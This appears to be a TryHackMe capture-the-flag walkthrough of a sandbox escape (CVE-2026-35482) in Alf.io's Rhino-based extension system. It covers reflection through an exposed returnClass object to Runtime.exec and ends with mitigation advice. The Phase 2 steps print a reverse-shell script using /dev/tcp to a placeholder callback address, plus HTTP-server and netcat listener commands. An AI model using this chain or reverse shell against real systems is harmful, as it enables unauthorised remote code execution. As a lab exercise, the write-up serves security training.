# NoScope: Finding RCE — TryHackMe Walkthrough

Official room: https://tryhackme.com/room/noscoperce

## Room Overview & Information

**Category:** Web exploitation / AI-assisted penetration testing  
**Difficulty:** Challenge-based  
**Vulnerability:** CVE-2026-35482, a sandbox escape in an Alf.io extension script environment.  
**Goal:** Observe NoScope's automated assessment, understand the vulnerable JavaScript sandbox, and reproduce the authorised lab's extension-triggered remote code execution.

This room uses an Alf.io event-management application with an extension system. The vulnerable version injects a Java `Class` object called `returnClass` into the JavaScript scope. Because the sandbox relies on a blocklist that looks for dangerous class names in the script text, using the injected object to resolve a class dynamically bypasses the filter. The resulting Java reflection path can reach `Runtime.exec()`.

Only run these steps against the machine deployed for this room. The payloads below use placeholders for the AttackBox address and must not be pointed at a real service.

## Phase 1: Reconnaissance & Enumeration

### Task 1: Introduction and vulnerability model

Alf.io is a Java/Spring Boot event-management platform. Its extension mechanism allows scripts to run when application events occur. The intended sandbox restricts access to the underlying JVM. In the vulnerable design, however, the application exposes `returnClass`, a raw Java class object.

The critical trust error is that the blocklist assumes dangerous functionality cannot be reached if its name is not present literally in the script. Dynamic class lookup defeats that assumption: the script can call `returnClass.forName('java.lang.Runtime')` without spelling the blocked class name in the expected form.

This is a sandbox escape leading to OS command execution. A sandbox must constrain capabilities, not merely block a few strings.

### Task 2: Vulnerability Hunting with NoScope

Start the lab machine. When it has finished booting, open the NoScope interface provided by the room and test the assigned `MACHINE_IP`. Fill in the application's basic details and start the automated assessment.

Observe the activity log as the tool maps the application, explores the extension surface, and validates candidate findings. Treat the report as useful evidence, but understand what was actually tested and what proof supports the conclusion.

### Question 1: “What sandboxing engine did NoScope identify as the one in use?”

Review the validated finding or report produced by the room's NoScope assessment. The scenario identifies the JavaScript sandbox as **Mozilla Rhino**. Submit the engine name as requested.

### Question 2: “What was the flag value NoScope retrieved out of the flag.txt file during its engagement?”

Open the report and locate the flag value that NoScope retrieved from the lab's `flag.txt`. Submit the exact value shown by the current room. This public write-up does not publish the flag; use `flag{hidden}` as a redaction placeholder.

## Phase 2: Vulnerability Analysis & Initial Access

### Task 3: Weaponizing the CVE

The room states that the target runs Alf.io `2.0-M5-2509-1`, is vulnerable to CVE-2026-35482, and provides administrator credentials for the lab. An event has already been configured. The objective is to register an extension that executes a reverse-shell script when the specified event is triggered.

### Step 1: Prepare the callback on the AttackBox

Start the AttackBox and determine its address that the lab machine can reach. Use that address in place of `CONNECTION_IP`.

Create a file named `rev.sh`:

```bash
#!/bin/bash
bash -i >& /dev/tcp/CONNECTION_IP/4444 0>&1 &
```

The script opens a Bash TCP connection back to the listener. The callback IP must be reachable from the target; do not use a loopback address unless both processes are on the same host.

Serve the file over HTTP:

```bash
python3 -m http.server 80
```

This starts a simple file server in the current directory. Keep it running so the target can download `rev.sh`.

In a second terminal, start a listener:

```bash
nc -lvnp 4444
```

- `-l` listens for an incoming connection.
- `-v` enables verbose output.
- `-n` disables reverse DNS lookup.
- `-p 4444` selects the local listening port.

Use only the lab's assigned AttackBox and target.

### Step 2: Understand the extension payload

The exploit uses the injected `returnClass` object to load Java classes by name. The room's intended chain is:

1. Resolve `java.lang.Runtime` dynamically.
2. Resolve `java.lang.String` as the argument type.
3. Obtain the runtime object through reflection.
4. Invoke `Runtime.exec()` to download the callback script.
5. Change the downloaded script's permissions.
6. Execute the script.
7. Observe the callback at the listener.

The important technical point is that `Runtime.exec(String)` does not invoke a shell to expand arbitrary shell metacharacters. Separate commands are therefore invoked explicitly, as the room's example does.

Use the exact JavaScript payload and event metadata supplied in the official task. Keep the callback address as a placeholder until you substitute the AttackBox address for your own instance. Do not run the payload against any system other than the deployed lab.

### Step 3: Register the extension

1. Open `http://MACHINE_IP/admin` in the lab browser.
2. Sign in using the administrator credentials provided by the room.
3. Navigate to **Extension** and choose the option to add a new extension.
4. Enter an extension path such as `System/rev`, as the room demonstrates.
5. Paste the task's extension script with the correct callback address.
6. Save the extension and verify that the application accepts it.

The script's metadata registers it for the event `EVENT_STATUS_CHANGE`. This event binding is important because saving the extension alone does not necessarily execute it.

### Step 4: Trigger the extension

The room has an event prepared for the exercise. Navigate to **Events**, choose **Load expired events**, locate the supplied event, and select **Publish now**. This generates the event that invokes the registered extension.

Watch the Netcat listener. If the callback arrives, verify the shell identity and host as permitted by the task. A connection to the listener is evidence that the callback executed, but it is still necessary to verify the session and avoid claiming privileges that have not been demonstrated.

If the callback does not arrive:
- Confirm the HTTP server is serving the directory containing `rev.sh`.
- Confirm the payload uses the correct AttackBox address.
- Confirm port 80 and port 4444 are reachable in the lab network.
- Confirm the extension was saved and is bound to the correct event.
- Trigger the event again as the room describes.

The room notes that the extension can be triggered again by hiding the event: edit the event date to a future date, save it, then select **Actions → hide from list**. Use this only to repeat the authorised lab exercise.

### Question: “On what event is the exploit payload triggered?”

Answer: `EVENT_STATUS_CHANGE`.

## Phase 3: Privilege Escalation & Post-Exploitation

This exercise's documented chain targets extension-triggered command execution. It does not describe a separate local privilege-escalation stage, so do not claim root or SYSTEM unless the live session explicitly verifies that identity. After a callback, check the current user and host, preserve only the evidence needed for the exercise, and stop once the stated objective is demonstrated.

## Phase 4: Room Questions & Flags Walkthrough

| Question | Answer or validation method |
|---|---|
| What sandboxing engine did NoScope identify as the one in use? | Mozilla Rhino |
| What was the flag value NoScope retrieved out of the flag.txt file during its engagement? | Read the report from the active lab; redacted here as flag{hidden} |
| On what event is the exploit payload triggered? | EVENT_STATUS_CHANGE |

## Phase 5: Key Takeaways & Mitigation / Remediation

The exploit demonstrates that a blocklist-based sandbox can fail when it exposes powerful objects and allows dynamic reflection. The root cause is excessive capability exposure and an incomplete security boundary, not merely a missing blocked string.

Recommended controls:
- Do not expose raw Java reflection or unrestricted class-loading objects to untrusted scripts.
- Use a capability-based sandbox that denies dangerous operations by construction.
- Run extension code in a separate process or container with minimal privileges and strict network/file access.
- Restrict and authenticate extension management.
- Validate extension provenance and audit changes.
- Monitor unexpected child processes and outbound connections.
- Patch to a version that fixes the vulnerable binding and sandbox escape.

## Summary

NoScope's finding demonstrates a JavaScript-to-JVM sandbox escape through an exposed class object. The workflow moves from automated identification to a manual reproduction in the lab, registers an event-driven extension, and verifies the callback. The security lesson is to constrain capabilities instead of relying on string-based blocklists.